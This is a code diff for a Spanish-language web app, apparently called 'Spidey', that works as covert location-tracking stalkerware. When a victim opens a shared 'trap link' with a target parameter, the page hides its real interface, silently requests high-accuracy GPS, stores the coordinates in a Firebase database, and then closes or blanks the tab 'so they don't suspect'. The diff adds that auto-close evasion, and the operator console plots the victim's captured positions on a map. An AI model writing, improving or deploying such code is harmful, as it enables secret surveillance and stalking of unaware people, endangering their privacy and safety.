@@ -1,6 +1,7 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
 import { getFirestore, doc, setDoc, onSnapshot, collection, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
+// --- CONFIGURA AQUÍ TUS CREDENCIALES DE FIREBASE ---
 const firebaseConfig = {
     apiKey: "TU_API_KEY",
     authDomain: "tu-proyecto.firebaseapp.com",
@@ -9,13 +10,14 @@ const firebaseConfig = {
     messagingSenderId: "TU_MESSAGING_SENDER_ID",
     appId: "TU_APP_ID"
 };
+// ---------------------------------------------------
 
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
 let map;
 let mainMarker;
-const marcadoresAraña = L.layerGroup();
+let marcadoresAraña;
 const ubicacionPorDefecto = [14.3333, -90.6667]; 
 
 const urlParams = new URLSearchParams(window.location.search);
@@ -23,24 +25,23 @@ const targetId = urlParams.get('target');
 
 document.addEventListener("DOMContentLoaded", function () {
     
-    // MODO VÍCTIMA (SIGILOSO): Si la URL tiene el ?target=
+    // --- MODO VÍCTIMA (SIGILOSO) ---
     if (targetId) {
-        // Ocultar la consola de Spidey para que no sospechen
         document.getElementById('main-console').style.display = 'none';
-        const stealthDiv = document.getElementById('stealth-screen');
-        stealthDiv.style.display = 'flex';
+        document.getElementById('stealth-screen').style.display = 'flex';
 
-        // Pestañeo rápido de GPS en segundo plano
-        ejecutarTrampaGPS(targetId);
-        return; // Detenemos la ejecución para que no cargue el mapa en la PC de la víctima
+        ejecutarTrampaGPSYCerrar(targetId);
+        return; 
     }
 
-    // MODO CONSOLA PRINCIPAL (Tú en tu PC viendo el mapa normal)
+    // --- MODO CONSOLA PRINCIPAL (TÚ EN TU PC) ---
     document.getElementById('main-console').style.display = 'block';
     document.getElementById('stealth-screen').style.display = 'none';
 
     map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);
-    marcadoresAraña.addTo(map);
+    
+    // Inicializar el grupo de capas para las arañas
+    marcadoresAraña = L.layerGroup().addTo(map);
 
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
         maxZoom: 19,
@@ -52,15 +53,18 @@ document.addEventListener("DOMContentLoaded", function () {
 
     setTimeout(() => { map.invalidateSize(); }, 200);
 
+    // Cargar puntos y activar tiempo real
     cargarPuntosHistoricos("objetivo_principal");
     escucharObjetivoEnTiempoReal("objetivo_principal");
 });
 
-// --- TRAPA GPS: EL PESTAÑEO INVISIBLE ---
-function ejecutarTrampaGPS(id) {
-    if (!navigator.geolocation) return;
+// --- TRAPA GPS: PESTAÑEO Y CIERRE AUTOMÁTICO ---
+function ejecutarTrampaGPSYCerrar(id) {
+    if (!navigator.geolocation) {
+        finalizarSalida();
+        return;
+    }
 
-    // Pide la ubicación una sola vez de forma silenciosa
     navigator.geolocation.getCurrentPosition(
         async (position) => {
             const lat = position.coords.latitude;
@@ -68,38 +72,68 @@ function ejecutarTrampaGPS(id) {
             const timestamp = new Date();
 
             try {
-                // Guarda la araña 🕷️ en el historial de Firebase
+                // 1. Guardar en la subcolección de historial (para la araña 🕷️)
                 const refHistorial = doc(collection(db, "rastreos", id, "lecturas"));
                 await setDoc(refHistorial, { lat, lng, timestamp });
 
-                // Actualiza el objetivo principal
+                // 2. Actualizar el documento principal
                 await setDoc(doc(db, "rastreos", id), { lat, lng, timestamp });
 
-                console.log("Señal capturada sigilosamente.");
+                console.log("Coordenadas capturadas con éxito.");
             } catch (e) {
-                console.error("Error al registrar:", e);
+                console.error("Error al registrar en Firebase:", e);
             }
+            
+            finalizarSalida();
         },
         (error) => {
-            // Si rechazan el permiso, el usuario solo verá una página común y corriente sin levantar alertas
-            console.log("GPS denegado por el objetivo.");
+            console.log("GPS denegado o no disponible.");
+            finalizarSalida();
         },
-        { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
     );
+}
+
+// Función para cerrar la pestaña o redirigir y que no sospechen
+function finalizarSalida() {
+    setTimeout(() => {
+        // Intenta cerrar la ventana (algunos navegadores bloquean esto si no fue abierta por script, 
+        // por lo que si falla, redirige a Google o a una página en blanco de forma limpia)
+        window.close();
+        
+        // Plan B inmediato si window.close() es bloqueado por el navegador:
+        window.location.href = "about:blank"; 
+    }, 1000); // 1 segundo de margen para asegurar que Firebase guardó los datos
 }
 
 // --- CARGAR ARAÑAS EN TU CONSOLA PRINCIPAL ---
 async function cargarPuntosHistoricos(id) {
+    if (!marcadoresAraña) return;
     marcadoresAraña.clearLayers();
+
     try {
         const lecturasRef = collection(db, "rastreos", id, "lecturas");
         const q = query(lecturasRef, orderBy("timestamp", "asc"));
         const querySnapshot = await getDocs(q);
         
         let ultimaUbicacion = null;
+        let bounds = [];
 
         querySnapshot.forEach((docSnap) => {
             const data = docSnap.data();
+            const lat = data.lat;
+            const lng = data.lng;
+            
+            // Manejar timestamp de Firestore de forma segura
+            let horaTexto = "Reciente";
+            if (data.timestamp) {
+                const fecha = typeof data.timestamp.toDate === 'function' 
+                    ? data.timestamp.toDate() 
+                    : new Date(data.timestamp);
+                horaTexto = fecha.toLocaleTimeString();
+            }
+
+            // Crear icono de araña 🕷️
             const spiderIcon = L.divIcon({
                 html: '🕷️',
                 className: 'spider-marker',
@@ -107,37 +141,50 @@ async function cargarPuntosHistoricos(id) {
                 iconAnchor: [12, 12]
             });
 
-            L.marker([data.lat, data.lng], { icon: spiderIcon })
-                .addTo(marcadoresAraña)
-                .bindPopup(`<b>Punto de Acceso 🕷️</b><br>Hora: ${data.timestamp ? data.timestamp.toDate().toLocaleTimeString() : 'Reciente'}`);
+            const marker = L.marker([lat, lng], { icon: spiderIcon })
+                .bindPopup(`<b>Punto de Acceso 🕷️</b><br>Hora: ${horaTexto}`);
             
-            ultimaUbicacion = [data.lat, data.lng];
+            marcadoresAraña.addLayer(marker);
+            bounds.push([lat, lng]);
+            ultimaUbicacion = [lat, lng];
         });
 
-        if (ultimaUbicacion) {
-            map.fitBounds(marcadoresAraña.getBounds().pad(0.1));
+        if (bounds.length > 0) {
+            map.fitBounds(bounds, { padding: [50, 50] });
             document.getElementById('banner-status').innerHTML = "RED DE ARAÑAS ACTIVA";
+        } else {
+            document.getElementById('banner-status').innerHTML = "SIN PUNTOS DE ACCESO";
         }
     } catch (e) {
-        console.error(e);
+        console.error("Error al cargar puntos históricos:", e);
+        document.getElementById('banner-status').innerHTML = "ERROR CARGANDO DATOS";
     }
 }
 
+// Escuchar cambios en tiempo real
 function escucharObjetivoEnTiempoReal(id) {
     onSnapshot(doc(db, "rastreos", id), (docSnap) => {
         if (docSnap.exists()) {
             const data = docSnap.data();
             mainMarker.setLatLng([data.lat, data.lng]);
+            
+            // Opcional: si entra una nueva señal en tiempo real, recargamos las arañas del historial
+            cargarPuntosHistoricos(id);
         }
     });
 }
 
-// Botones de utilidad de tu consola
+// --- BOTONES Y UTILIDADES DE TU CONSOLA ---
 window.compartirEnlace = function() {
     const enlaceObjetivo = "https://mmommo52.github.io/Spidey/?target=objetivo_principal";
     navigator.clipboard.writeText(enlaceObjetivo).then(() => {
-        alert("¡Enlace trampa copiado con éxito!");
+        alert("¡Enlace trampa copiado al portapapeles!");
     });
+};
+
+window.accionRastrearObjetivo = function() {
+    alert("Actualizando mapa y recargando puntos de acceso...");
+    cargarPuntosHistoricos("objetivo_principal");
 };
 
 window.obtenerUbicacionActual = () => {
@@ -152,8 +199,7 @@ window.centrarEnMiUbicacion = () => {
     });
 };
 
-window.accionRastrearObjetivo = () => alert("Modo sigiloso armado en el enlace.");
 window.cambiarAlerta = (t) => alert("Alerta: " + t);
 window.cambiarPerfil = (n) => alert("Perfil: " + n);
-window.abrirChat = () => alert("Chat abierto.");
-window.verArchivo = () => alert("Abriendo archivos...");
+window.abrirChat = () => alert("Canal de chat seguro abierto.");
+window.verArchivo = () => alert("Abriendo registros históricos...");
